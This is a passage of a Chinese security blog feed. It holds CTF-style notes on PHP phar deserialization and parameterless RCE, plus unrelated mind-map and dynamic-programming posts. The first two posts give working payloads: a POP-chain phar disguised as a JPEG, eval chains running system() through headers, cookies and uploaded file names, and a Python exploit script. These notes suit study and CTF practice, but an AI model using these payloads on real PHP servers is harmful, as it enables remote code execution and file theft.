&quot;:/etc:/tmp&quot;);</code></p><p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p><p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p><p>于是初步构造payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$a &#x3D; new User();$a-&gt;db &#x3D; new File();?&gt;</code></pre><p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p><pre class="language-php" data-language="php"><code class="language-php">public function __call($func, $args) &#123;    array_push($this-&gt;funcs, $func);    foreach ($this-&gt;files as $file) &#123;        $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();    &#125;&#125;</code></pre><p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p><p><strong>foreach</strong>：遍历数组</p><p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass User &#123;    public $db;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files &#x3D; array(new File());        $this-&gt;results &#x3D; array();        $this-&gt;funcs &#x3D; array();    &#125;&#125;class File &#123;    public $filename;    public function __construct()    &#123;        $this-&gt;filename&#x3D;&#39;&#x2F;flag.txt&#39;;    &#125;&#125;$o &#x3D; new User();$o -&gt; db &#x3D; new FileList();$phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为 phar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置 stub$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的 meta-data 存入 manifest$phar-&gt;addFromString(&quot;poc.php&quot;, &quot;poc&quot;); &#x2F;&#x2F;添加要压缩的文件&#x2F;&#x2F;签名自动计算$phar-&gt;stopBuffering();rename(&#39;phar.phar&#39;,&#39;phar.jpg&#39;);?&gt;</code></pre><p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;参考&quot;&gt;&lt;a href=&quot;#参考&quot; class=&quot;headerlink&quot; title=&quot;参考&quot;&gt;&lt;/a&gt;参考&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2958#toc-2&quot;&gt;Phar与Stream Wrapper造成PHP RCE的深入挖掘&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/205943.html&quot;&gt;PHAR反序列化拓展操作总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://paper.seebug.org/680/&quot;&gt;利用 phar 拓展 php 反序列化漏洞攻击面&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数RCE</title>
    <link href="https://www.extrader.top/posts/4f9c9406/"/>
    <id>https://www.extrader.top/posts/4f9c9406/</id>
    <published>2020-04-28T10:21:37.000Z</published>
    <updated>2020-04-28T10:21:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)</code></p><a id="more"></a><p><strong>目录下文件</strong>：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429110200063.png" alt loading="lazy"></p><h4 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a><strong>测试代码</strong></h4><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;index.php&lt;?phpif(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p><code>(?R)</code>引用当前表达式，后面加了<code>?</code>递归调用</p><p>以上正则表达式只匹配<code>a(b(c()))</code>或<code>a()</code>这种格式，不匹配<code>a(&quot;123&quot;)</code>，也就是说我们传入的值函数不能带有参数</p><h4 id="Payload1-getenv"><a href="#Payload1-getenv" class="headerlink" title="Payload1-getenv()"></a>Payload1-getenv()</h4><pre class="language-php" data-language="php"><code class="language-php">var_dump(getenv(phpinfo()));</code></pre><p>可以获取敏感信息</p><ul><li><strong>getenv()</strong>：获取一个环境变量的值，<code>phpinfo()</code>可以获取所有环境变量</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429113257924.png" alt loading="lazy"></p><h4 id="Payload2-getallheaders"><a href="#Payload2-getallheaders" class="headerlink" title="Payload2-getallheaders()"></a><strong>Payload2</strong>-getallheaders()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(getallheaders()));</code></pre><p>RCE</p><ul><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>getallheaders()</strong>：获取全部 HTTP 请求头信息</li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429114144142.png" alt loading="lazy"></p><h4 id="Payload3-get-defined-vars"><a href="#Payload3-get-defined-vars" class="headerlink" title="Payload3-get_defined_vars()"></a>Payload3-get_defined_vars()</h4><pre class="language-php" data-language="php"><code class="language-php">eval(end(current(get_defined_vars())));&amp;flag&#x3D;system(&#39;ls&#39;);</code></pre><p>利用全局变量进RCE</p><ul><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，会返回<code>$_GET,$_POST,$_COOKIE,$_FILES</code>全局变量的值</li><li><strong>current()</strong>：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回<code>$_GET</code>变量的数组值</li><li><strong>get_defined_vars()</strong>：返回由所有已定义变量所组成的数组，此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。返回数组顺序为<code>get-&gt;post-&gt;cookie-&gt;files</code></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/image-20200429115651090.png" alt loading="lazy"></p><p>而如果网站对<code>$_GET,$_POST,$_COOKIE</code>都做的过滤， 那我们只能从<code>$_FILES</code>入手了，exp如下：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsdef str2hex(payload):  txt &#x3D; &#39;&#39;  for i in payload:      txt +&#x3D; hex(ord(i))[-2:]  return txtpayload &#x3D; str2hex(&quot;system(&#39;cat flag.php&#39;);&quot;)files &#x3D; &#123;    payload: b&#39;extrader&#39;&#125;r &#x3D; requests.post(&quot;http:&#x2F;&#x2F;192.168.0.107&#x2F;index.php?exp&#x3D;eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;, files&#x3D;files, allow_redirects&#x3D;False)  # allow_redirects&#x3D;False 禁用重定向处理print(r.content.decode())</code></pre><ul><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个，<code>array_rand()</code>返回随机单元的键名。 否则就返回包含随机键名的数组。</li><li><strong>end()</strong>：将数组的内部指针指向最后一个单元</li><li><strong>hex2bin()</strong>：转换十六进制字符串为二进制字符串</li></ul><p>结果将输出<code>flag.php</code>文件的全部内容，由于空格和点都会被替换成下换线，所以需要用十六进制进行绕过</p><h4 id="Payload4-session-start"><a href="#Payload4-session-start" class="headerlink" title="Payload4-session_start()"></a>Payload4-session_start()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));var_dump(file_get_contents(session_id(session_start())))highlight_file(session_id(session_start()));readfile(session_id(session_start()));抓包传入Cookie: PHPSESSID&#x3D;(想读的文件)即可</code></pre><p>RCE：</p><pre class="language-php" data-language="php"><code class="language-php">eval(hex2bin(session_id(session_start())));抓包传入Cookie: PHPSESSID&#x3D;(&quot;system(&#39;命令&#39;)&quot;的十六进制)</code></pre><p>以上的payload好像只适用于<code>php7</code>以下的版本，php7以上的不会显示</p><ul><li><strong>session_start()</strong>：启动新会话或者重用现有会话，成功开始会话返回 <strong><code>TRUE</code></strong> ，反之返回 <strong><code>FALSE</code></strong></li><li><strong>session_id()</strong>：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</li></ul><h4 id="Payload5-scandir"><a href="#Payload5-scandir" class="headerlink" title="Payload5-scandir()"></a>Payload5-scandir()</h4><p>文件读取：</p><pre class="language-php" data-language="php"><code class="language-php">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</code></pre><ul><li><strong>getcwd()</strong>：取得当前工作目录，成功则返回当前工作目录，失败返回 <strong><code>FALSE</code></strong>。</li><li><strong>dirname()</strong>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’<em>.</em>‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li><li><strong>chdir()</strong>：改变目录，成功时返回 <strong><code>TRUE</code></strong>， 或者在失败时返回 <strong><code>FALSE</code></strong>。</li><li><strong>scandir()</strong>：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 <strong><code>FALSE</code></strong>。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li><li><strong>array_flip()</strong>：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 <strong><code>NULL</code></strong>。</li><li><strong>array_rand()</strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，<strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li></ul><p><strong>array_flip()</strong>和<strong>array_rand()</strong>配合使用可随机返回当前目录下的文件名</p><p><strong>dirname(chdir(dirname()))</strong>配合切换文件路径</p><h4 id="绕过"><a href="#绕过" class="headerlink" title=".绕过"></a><code>.</code>绕过</h4><h5 id="current-localeconv"><a href="#current-localeconv" class="headerlink" title="current(localeconv())"></a><strong>current(localeconv())</strong></h5><ul><li><strong>localeconv()</strong>：返回一包含本地数字及货币格式信息的数组。而数组第一项就是<code>.</code></li></ul><h5 id="phpversion"><a href="#phpversion" class="headerlink" title="phpversion()"></a><strong>phpversion()</strong></h5><ul><li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li><li><code>floor(phpversion())</code>返回<code>7</code></li><li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li><li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li><li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li><li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li><li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li><li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li><li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li><li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li></ul><p><strong>floor()</strong>：舍去法取整，<strong>sqrt()</strong>：平方根，<strong>tan()</strong>：正切值，<strong>cosh()</strong>：双曲余弦，<strong>sinh()</strong>：双曲正弦，<strong>ceil()</strong>：进一法取整</p><h5 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a><strong>crypt()</strong></h5><p><code>chr(ord(hebrevc(crypt(phpversion()))))</code>返回<code>.</code></p><ul><li><code>hebrevc(crypt(arg))</code>可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</li></ul><p><strong>crypt()</strong>：单向字符串散列，返回散列后的字符串或一个少于 13 字符的字符串，从而保证在失败时与盐值区分开来。</p><p><strong>hebrevc()</strong>：将逻辑顺序希伯来文（logical-Hebrew）转换为视觉顺序希伯来文（visual-Hebrew），并且转换换行符，返回视觉顺序字符串。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p><strong>current()</strong>的别名<strong>pos()</strong></p><p><strong>readgzfile</strong>可以代替<strong>readfile</strong></p><p>目录操作：</p><ul><li><strong>getchwd()</strong> ：函数返回当前工作目录。</li><li><strong>scandir()</strong> ：函数返回指定目录中的文件和目录的数组。</li><li><strong>dirname()</strong> ：函数返回路径中的目录部分。</li><li><strong>chdir()</strong> ：函数改变当前的目录。</li></ul><p>数组相关的操作：</p><ul><li><a href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a> ： 将内部指针指向数组中的最后一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a> ：将内部指针指向数组中的下一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a> ：将内部指针指向数组中的上一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_reset.asp">reset()</a> ： 将内部指针指向数组中的第一个元素，并输出</li><li><a href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a> ： 返回当前元素的键名和键值，并将内部指针向前移动</li></ul><h4 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h4><h5 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h5><p>扫描目录<code>.git</code>源码泄露，<code>Githack</code>得到<code>index</code>源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;    if (!preg_match(&#39;&#x2F;data:\&#x2F;\&#x2F;|filter:\&#x2F;\&#x2F;|php:\&#x2F;\&#x2F;|phar:\&#x2F;\&#x2F;&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;        if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[a-z,_]+\((?R)?\)&#x2F;&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;            if (!preg_match(&#39;&#x2F;et|na|info|dec|bin|hex|oct|pi|log&#x2F;i&#39;, $_GET[&#39;exp&#39;])) &#123;                &#x2F;&#x2F; echo $_GET[&#39;exp&#39;];                @eval($_GET[&#39;exp&#39;]);            &#125;            else&#123;                die(&quot;还差一点哦！&quot;);            &#125;        &#125;        else&#123;            die(&quot;再好好想想！&quot;);        &#125;    &#125;    else&#123;        die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;&#x2F;&#x2F; highlight_file(__FILE__);?&gt;</code></pre><p>payload1：</p><pre class="language-php" data-language="php"><code class="language-php">highlight_file(next(array_reverse(scandir(current(localeconv())))));</code></pre><p>payload2：</p><pre class="language-php" data-language="php"><code class="language-php">show_source(session_id(session_start()));Cookie: PHPSESSID&#x3D;flag.php</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></li><li><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></li><li><a href="http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html">http://www.manongjc.com/detail/13-ksgbihhdbvdbnza.html</a></li><li><a href="https://www.gem-love.com/ctf/530.html?replytocom=5">https://www.gem-love.com/ctf/530.html?replytocom=5</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;膜膜膜膜膜膜（这东西真的是奇淫技巧）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_replace(&amp;#39;/[^\W]+\((?R)?\)/&amp;#39;, &amp;#39;&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>思维导图收集</title>
    <link href="https://www.extrader.top/posts/6f37048/"/>
    <id>https://www.extrader.top/posts/6f37048/</id>
    <published>2020-04-27T02:56:56.000Z</published>
    <updated>2020-04-27T02:56:56.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="GIT命令"><a href="#GIT命令" class="headerlink" title="GIT命令"></a>GIT命令</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/git命令.jpg" alt="git命令" style="zoom: 25%;" loading="lazy"><h3 id="网络安全绪论"><a href="#网络安全绪论" class="headerlink" title="网络安全绪论"></a>网络安全绪论</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全绪论.jpg" alt="网络安全绪论" style="zoom:25%;" loading="lazy"><h3 id="网络安全发展与未来"><a href="#网络安全发展与未来" class="headerlink" title="网络安全发展与未来"></a>网络安全发展与未来</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络安全发展与未来.jpg" alt="网络安全发展与未来" style="zoom:25%;" loading="lazy"><h3 id="Web攻击及防御技术"><a href="#Web攻击及防御技术" class="headerlink" title="Web攻击及防御技术"></a>Web攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/Web攻击及防御技术.jpg" alt="Web攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="网络监听及防御技术"><a href="#网络监听及防御技术" class="headerlink" title="网络监听及防御技术"></a>网络监听及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络监听及防御技术.jpg" alt="网络监听及防御技术" style="zoom:25%;" loading="lazy"><h3 id="扫描与防御技术"><a href="#扫描与防御技术" class="headerlink" title="扫描与防御技术"></a>扫描与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/扫描与防御技术.jpg" alt="扫描与防御技术" style="zoom:25%;" loading="lazy"><h3 id="欺骗攻击及防御技术"><a href="#欺骗攻击及防御技术" class="headerlink" title="欺骗攻击及防御技术"></a>欺骗攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/欺骗攻击及防御技术.jpg" alt="欺骗攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="木马攻击及防御技术"><a href="#木马攻击及防御技术" class="headerlink" title="木马攻击及防御技术"></a>木马攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/木马攻击及防御技术.jpg" alt="木马攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="口令破解与防御技术"><a href="#口令破解与防御技术" class="headerlink" title="口令破解与防御技术"></a>口令破解与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/口令破解与防御技术.jpg" alt="口令破解与防御技术" style="zoom:25%;" loading="lazy"><h3 id="拒绝服务供给与防御技术"><a href="#拒绝服务供给与防御技术" class="headerlink" title="拒绝服务供给与防御技术"></a>拒绝服务供给与防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/拒绝服务供给与防御技术.png" alt="拒绝服务供给与防御技术" style="zoom:25%;" loading="lazy"><h3 id="缓冲区溢出攻击及防御技术"><a href="#缓冲区溢出攻击及防御技术" class="headerlink" title="缓冲区溢出攻击及防御技术"></a>缓冲区溢出攻击及防御技术</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/缓冲区溢出攻击及防御技术.jpg" alt="缓冲区溢出攻击及防御技术" style="zoom:25%;" loading="lazy"><h3 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/计算机病毒.jpg" alt="计算机病毒" style="zoom:25%;" loading="lazy"><h3 id="网络攻击链手段防护产品"><a href="#网络攻击链手段防护产品" class="headerlink" title="网络攻击链手段防护产品"></a>网络攻击链手段防护产品</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/网络攻击链手段防护产品.png" alt="网络攻击链手段防护产品" style="zoom:10%;" loading="lazy"><h3 id="nginx源码分析全景图"><a href="#nginx源码分析全景图" class="headerlink" title="nginx源码分析全景图"></a>nginx源码分析全景图</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/思维导图收集/nginx源码分析全景图.png" alt="nginx源码分析全景图" style="zoom:6%;" loading="lazy"><p>另外在P神的github上也有些：<a href="https://github.com/phith0n/Mind-Map">https://github.com/phith0n/Mind-Map</a></p><ul><li>图片均来自网络，侵删</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;GIT命令&quot;&gt;&lt;a href=&quot;#GIT命令&quot; class=&quot;headerlink&quot; title=&quot;GIT命令&quot;&gt;&lt;/a&gt;GIT命令&lt;/h3&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/ima
      
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="思维导图" scheme="https://www.extrader.top/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
  </entry>
  
  <entry>
    <title>算法-动态规划</title>
    <link href="https://www.extrader.top/posts/e57c001c/"/>
    <id>https://www.extrader.top/posts/e57c001c/</id>
    <published>2020-04-21T09:23:34.000Z</published>
    <updated>2020-04-21T09:23:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h3><p><code>1,1,2,3,5,8,13...</code>，状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png" alt loading="lazy"></p><a id="more"></a><h4 id="暴力递归"><a href="#暴力递归" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    return main(a-1) + main(a-2)</code></pre><p>时间复杂度为<code>O(2^n)</code>，有如下递归树：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190828749.png" alt loading="lazy"></p><p>我们可以看到许多的计算都重复了，例如下面的<code>f(18)</code>等，那么如何避免这个问题呢？有效的方法就是将第一次计算出的<code>f(18)</code>的结果保留下来，如果下次再计算到这个<code>f(18)</code>的时候直接将结果取出来即可，简称备忘录方法，如下：</p><h4 id="带备忘录的递归解法"><a href="#带备忘录的递归解法" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code class="language-python">memo &#x3D; dict()def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    if a in memo:        return memo[a]    memo[a] &#x3D; main(a-1) + main(a-2)    return main(a-1) + main(a-2)</code></pre><h4 id="DP-table解法"><a href="#DP-table解法" class="headerlink" title="DP table解法"></a><strong>DP table解法</strong></h4><p>自底向上优化</p><pre class="language-python" data-language="python"><code class="language-python">dp &#x3D; []def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    dp.append(1)    dp.append(1)    for i in range(2, a):        dp.append(dp[i - 1] + dp[i - 2])    return dp[a-1]</code></pre><p>原理图如下(emmmmm，图是搬运过来的，所以前面的第0位还是用到了的，往前移一位就行了)</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190143099.png" alt loading="lazy"></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>再进行空间复杂度的优化</p><pre class="language-python" data-language="python"><code class="language-python">def main(a):    if a &#x3D;&#x3D; 1 or a &#x3D;&#x3D; 2:        return 1    prev &#x3D; 1    curr &#x3D; 1    for i in range(3, a + 1):        num &#x3D; prev + curr        prev &#x3D; curr        curr &#x3D; num    return curr</code></pre><p>由原来的时间复杂度<code>O(2^n)</code>变为了<code>O(n)</code>，空间复杂度降为<code>O(1)</code></p><h3 id="凑零钱问题"><a href="#凑零钱问题" class="headerlink" title="凑零钱问题"></a>凑零钱问题</h3><p>假设给你<code>k</code>中面值的硬币，面值分别为<code>c1，c2，c3 ... ck</code>，每种硬币的数量无限，再给一个总金额<code>amount</code>，问<strong>最少</strong>需要几枚硬币凑出这个金额，如果不可能凑出，则返回-1</p><p>状态转移方程：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185311310.png" alt loading="lazy"></p><h4 id="暴力递归-1"><a href="#暴力递归-1" class="headerlink" title="暴力递归"></a><strong>暴力递归</strong></h4><pre class="language-python" data-language="python"><code class="language-python">def coinChange(coins, amount):    def main(n):        if n &#x3D;&#x3D; 0:  # 当n - coin &#x3D; 0 的时候说明这条路走的通            return 0        if n &lt; 0:  # 当n - coin &lt; 0 的时候则说明这条路走不通            return -1        res &#x3D; float(&quot;INF&quot;)  # float(&quot;INF&quot;)为正无穷大，负无穷大则为float(&quot;-INF&quot;)        for coin in coins:  # 递归列表            sub &#x3D; main(n - coin)  # 取出一个值n就要减去那个值            if sub &#x3D;&#x3D; -1:                continue  # 当main函数的返回值为-1的时候，这条路走不通，则挑出循环            res &#x3D; min(res, 1 + sub)  # 当到了树的最低下，上面的if语句没有执行跳出去，则使res&#x3D;sub+1        return res if res !&#x3D; float(&quot;INF&quot;) else -1  # 这条路走的通，则返回res的值给sub，结合上面的一条语句进行计数    return main(amount)# 最后取出第一个选择的那个数字的时候计算出的res最小值，然后再把每个数字的最小值拿出来比较得出最终的最小值if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    print(coinChange([1, 2, 5], 11))</code></pre><p>以上的路走的通的意思是能够凑出这些硬币，递归图如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421185848166.png" alt loading="lazy"></p><h4 id="带备忘录的递归解法-1"><a href="#带备忘录的递归解法-1" class="headerlink" title="带备忘录的递归解法"></a><strong>带备忘录的递归解法</strong></h4><pre class="language-python" data-language="python"><code 